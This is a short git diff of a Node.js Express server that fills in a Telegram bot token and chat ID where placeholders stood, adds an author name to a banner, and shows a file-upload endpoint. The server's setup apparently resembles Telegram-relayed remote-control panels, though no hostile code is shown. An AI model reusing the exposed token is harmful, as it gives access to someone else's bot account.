@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token ='PASTE BOT TOKEN'
-const id = 'PASTE CHAT ID'
+const token ='7176679886:AAEfa8CyE_UIx9YKDF5Dcqc_02JaEtm27nk'
+const id = '7142809639'
 const address = 'https://www.google.com'
 
 const app = express();
@@ -25,7 +25,7 @@ let currentNumber = ''
 let currentTitle = ''
 
 app.get('/', function (req, res) {
-    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
+    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙗𝙮 𝙍𝙖𝙟𝙖 </h1>')
 })
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
